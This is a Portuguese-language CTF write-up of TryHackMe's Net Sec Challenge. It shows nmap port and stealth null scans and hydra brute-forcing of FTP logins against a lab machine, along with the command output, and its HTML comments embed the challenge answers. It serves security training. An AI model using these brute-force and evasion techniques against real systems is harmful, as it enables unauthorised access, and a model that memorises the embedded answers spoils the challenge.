---
title: "TryHackMe: Net Sec Challenge"
description: Pratique as habilidades que você aprendeu no módulo Segurança de Rede.
author: c3n0r4
categories: [Challenges, Linux]
tags: [CTF-Médio, nmap, telnet, hydra]
media_subpath: /assets/images/netsecchallenge
image:
  path: capa.webp
comments: true
---

## Descrição do Desafio
Este desafio foi desenvolvido para avaliar o domínio das habilidades apresentadas no **módulo de Segurança de Rede**. Todas as etapas podem ser resolvidas utilizando apenas três ferramentas fundamentais: `nmap`, `telnet` e `hydra`.

## Perguntas do Desafio
### Nmap
Realizei uma varredura completa na máquina-alvo. Cada parâmetro foi escolhido com um propósito específico, facilitando a coleta das informações necessárias para responder às perguntas do desafio.

```console
nmap -p- -sC -sV -n -Pn -T4 10.10.32.74
```

- `-p-` Escaneia todas as 65.535 portas TCP, e não apenas as 1.000 portas mais comuns.
> Pergunta: Qual é o maior número de portas abertas em menos de 10.000?<br> <!-- 8080 --> Pergunta: 
> Há uma porta aberta fora das 1.000 portas comuns; ela está acima de 10.000. O que é?<br> <!-- 10021 -->
> Pergunta: Quantas portas TCP estão abertas?<br> <!-- 6 -->

- `-sC` Executa os scripts padrão do Nmap (NSE), que coletam informações como banners, cabeçalhos HTTP, banners de FTP e SSH, entre outros.
> Pergunta: Qual é o sinalizador oculto no cabeçalho do servidor HTTP?<br> <!-- THM{web_server_25352} -->
> Pergunta: Qual é o sinalizador oculto no cabeçalho do servidor SSH?<br> <!-- THM{946219583339} -->

- `-sV` Tenta descobrir a versão exata dos serviços que estão rodando nas portas abertas.
> Pergunta: Temos um servidor FTP escutando em uma porta não padrão. Qual é a versão do servidor FTP? <!-- vsftpd 3.0.5 -->

- `-n` Desativa a resolução de DNS, acelerando o scan ao não tentar resolver nomes de domínio.

- `-Pn` Ignora o ping prévio (host discovery) assume que o host está ativo. Isso garante que o scan seja executado mesmo se o ICMP estiver bloqueado.

- `-T4` Define o tempo/agressividade da varredura como “rápido”.

Saída do comando:

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
└─$ nmap -p- -sC -sV -n -Pn -T4 10.10.26.196 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 18:10 -03
Nmap scan report for 10.10.26.196
Host is up (0.23s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:db:ee:e5:4f:7d:79:43:d4:d1:9f:be:8e:c8:05:fd (RSA)
|   256 14:36:7c:16:03:b0:0d:73:c7:9c:14:26:be:d0:4a:27 (ECDSA)
|_  256 ba:35:91:7f:b1:ec:18:0d:4c:5e:bd:13:a8:7d:02:81 (ED25519)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{************}
80/tcp    open  http        lighttpd
|_http-title: Hello, world!
|_http-server-header: lighttpd THM{****************}
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
8080/tcp  open  http        Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
10021/tcp open  ftp         ****** *****
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.95%I=7%D=6/13%Time=684C9626%P=x86_64-pc-linux-gnu%r(NULL
SF:,2A,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{************}\x20\r\n");
Service Info: OS: Unix

Host script results:
|_nbstat: NetBIOS name: IP-10-10-26-196, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-06-13T21:20:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 611.55 seconds
```

### Desafio interativo utilizando nmap
> Pergunta: Acesse o endereço http://MACHINE_IP:8080. Você verá um pequeno desafio interativo. Resolva-o para obter uma flag. Qual é a flag exibida ao concluir o desafio? <!-- THM{321452667098} -->

Ao acessar o site, me deparei com a seguinte interface:

![](pagina-8080.webp)

Realizei um **Null Scan** `nmap -sN 10.10.26.196`, com isso, consegui capturar a flag. 

![](flag.webp)

Saída do comando:
```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
└─$ nmap -sN 10.10.26.196                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 18:11 -03
Nmap scan report for 10.10.26.196
Host is up (0.20s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
8080/tcp open|filtered http-proxy
10021/tcp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
```

- `-sN` O Nmap envia pacotes TCP sem nenhuma flag ativada no cabeçalho. Isso significa que ele envia um pacote completamente **em branco** para uma porta. Essa técnica é considerada uma **varredura furtiva**, usada principalmente para tentar evadir firewalls e sistemas de detecção de intrusão `IDS`.

### Hidra + Telnet
> Pergunta: Descobrimos dois nomes de usuário usando engenharia social: `eddie`e `quinn`. Qual é a bandeira escondida em um desses dois arquivos de conta e acessível via FTP? <!-- THM{f7443f99} -->

### Eddie
Comecei testando o usuário `eddie` utilizando o Hydra para força bruta no serviço FTP. Após alguns segundos, encontrei a senha:

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
└─$ hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.10.26.196 -s 10021           
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-13 18:12:37
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.26.196:10021/
[10021][ftp] host: 10.10.26.196   login: eddie   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-13 18:12:50
```

Conectei ao servidor FTP com as credenciais encontradas. Naveguei até o diretório inicial e listei os arquivos. Apesar de acessar o conteúdo, não encontrei nenhuma flag escondida no diretório:

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
└─$ ftp 10.10.26.196 10021
Connected to 10.10.26.196.
220 (vsFTPd 3.0.5)
Name (10.10.26.196:c3n0r4): eddie 
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls -larth
229 Entering Extended Passive Mode (|||30056|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001         3771 Sep 14  2021 .bashrc
-rw-r--r--    1 1001     1001          807 Sep 14  2021 .profile
-rw-r--r--    1 1001     1001          220 Sep 14  2021 .bash_logout
drwx------    2 1001     1001         4096 Sep 20  2021 .cache
drwxr-xr-x    3 1001     1001         4096 Sep 20  2021 .
drwxr-xr-x    3 1001     1001         4096 Sep 20  2021 ..
226 Directory send OK.
ftp> exit
221 Goodbye.
```

### Quinn
Com o usuário `quinn`, novamente usando Hydra, o ataque foi bem-sucedido e me revelou a senha:

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
└─$ hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.10.26.196 -s 10021
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-13 18:13:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.26.196:10021/
[10021][ftp] host: 10.10.26.196   login: quinn   password: ******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-13 18:13:14
```

Fiz login, Dessa vez, ao listar os arquivos do diretório, encontrei um arquivo `ftp_flag.txt`:

```console
┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
└─$ ftp 10.10.26.196 10021
Connected to 10.10.26.196.
220 (vsFTPd 3.0.5)
Name (10.10.26.196:c3n0r4): quinn
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls -larth
229 Entering Extended Passive Mode (|||30398|)
150 Here comes the directory listing.
-rw-r--r--    1 1002     1002         3771 Sep 14  2021 .bashrc
-rw-r--r--    1 1002     1002          807 Sep 14  2021 .profile
-rw-r--r--    1 1002     1002          220 Sep 14  2021 .bash_logout
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
-rw-------    1 1002     1002          723 Sep 20  2021 .viminfo
drwxr-xr-x    2 1002     1002         4096 Sep 20  2021 .
drwxr-xr-x    2 1002     1002         4096 Sep 20  2021 ..
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30622|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |*******************************************************************************************************************************************************|    18      119.57 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.07 KiB/s)
ftp> exit
221 Goodbye.
```

E ao abrir o arquivo, encontrei a flag:

```console               
┌──(c3n0r4㉿kali)-[~/tryhackme/room/netsecchallenge]
└─$ cat ftp_flag.txt                                    
THM{************}
```